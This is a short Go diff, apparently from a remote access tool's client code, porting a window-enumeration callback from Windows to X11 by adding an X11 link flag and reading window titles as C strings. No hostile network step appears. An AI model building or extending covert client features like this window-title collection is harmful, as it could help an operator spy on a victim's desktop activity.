@@ -1,12 +1,12 @@
 package windows
 
 /*
+#cgo LDFLAGS: -lX11
 #include "window.h"
 */
 import "C"
 
 import (
-	"rat/client/utils"
 	"rat/shared"
 )
 
@@ -15,8 +15,8 @@ var Windows []shared.Window
 
 // Callback for each window
 //export WindowCallback
-func WindowCallback(w C.Window) {
-	title := utils.WcharToString((*uint16)(w.title), -1)
+func WindowCallback(w C.Frame) {
+	title := C.GoString(w.title)
 
 	window := shared.Window{
 		Handle: int(w.handle),
